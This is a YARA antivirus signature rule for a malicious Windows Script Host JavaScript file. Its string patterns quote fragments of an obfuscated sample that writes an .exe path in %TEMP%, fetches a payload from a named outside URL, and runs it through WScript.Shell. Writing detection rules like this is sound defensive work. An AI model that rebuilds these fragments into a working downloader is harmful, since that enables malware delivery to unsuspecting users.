rule sig_20160328_dc404bb2436fa9226b4e9fb638081f1a {
  meta:
    description = "datamaliciousorder - file 20160328_dc404bb2436fa9226b4e9fb638081f1a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9cbdc307c6dad18ad0abd94820d025f82fb157c6aee75a2b727dde7eeb0d78c8"

  strings:
    $s1  = "function Bqilkeos() {return Czfdhw[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"N50kydF0b9.exe\";};" fullword ascii
    $s2  = "Rdkbpolmqr[Rpnwb](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Opxmyi](Bnuhr() * 11)} while (Rdkbpolmqr[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Czfdhw = function Ddxnvpa() {return WScript[Krvyobactt](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Mmdpvalgft(Nbaztxrps, Wnozz){return Nbaztxrps - Wnozz;};" fullword ascii
    $s6  = "function Kukcqednw(Gwdkh){Czfdhw[\"Run\"](Gwdkh, Sqjoqoxn, Sqjoqoxn);};" fullword ascii
    $s7  = "function Ynxkgko() {return ((Nakzwk == true) && (Nakzwk == Gqwxsoq)) ? 1 : Sqjoqoxn;};" fullword ascii
    $s8  = "var Bzsbvm = new this[\"Date\"]();" fullword ascii
    $s9  = "Gqwxsoq = true; " fullword ascii
    $s10 = "var Gqwxsoq = false;" fullword ascii
    $s11 = "function Bnuhr(){return 22;};" fullword ascii
    $s12 = " while (Hcrqdqc){" fullword ascii
    $s13 = "Nakzwk = true; " fullword ascii
    $s14 = "function Akupksobq(){return Kejihlgs;};" fullword ascii
    $s15 = "return Mmdpvalgft(Nlzpecxx, Evniiknm);" fullword ascii
    $s16 = "function Gkujc(){return Krvyobactt;};" fullword ascii
    $s17 = "var Nihobccs = false;" fullword ascii
    $s18 = "function Qmpeamyap()" fullword ascii
    $s19 = "var Nakzwk = false;" fullword ascii
    $s20 = "function Mbtzqhhzc(Eaausso) {var Hdvgbj = (1, 2, 3, 4, 5, Eaausso); return Hdvgbj;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}